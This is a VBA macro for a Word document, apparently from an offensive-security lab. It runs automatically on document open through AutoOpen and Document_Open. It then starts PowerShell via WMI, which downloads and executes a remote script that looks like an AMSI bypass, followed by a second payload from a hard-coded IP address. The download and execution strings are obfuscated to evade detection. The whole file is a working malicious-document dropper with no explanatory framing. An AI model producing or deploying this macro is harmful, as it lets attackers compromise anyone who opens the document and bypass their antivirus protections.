Sub MyMacro()
  Dim str As String
  Dim str2 As String
  str = "powershell Invoke-Expression (New-Object Net.WebClient).DownloadString('h'+'ttp://192.168.45.211/amsi.txt') | &(GAL I*X)"
  Wait (1)
  str2 = "powershell Invoke-Expression (New-Object Net.WebClient).DownloadString('h'+'ttp://192.168.45.211/1.txt') | &(GAL I*X)"
  GetObject("winmgmts:").Get("Win32_Process").Create str, Null, Null, pid
  Wait (1)
  GetObject("winmgmts:").Get("Win32_Process").Create str2, Null, Null, pid
End Sub

Sub Document_Open()
  MyMacro
End Sub

Sub AutoOpen()
  MyMacro
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub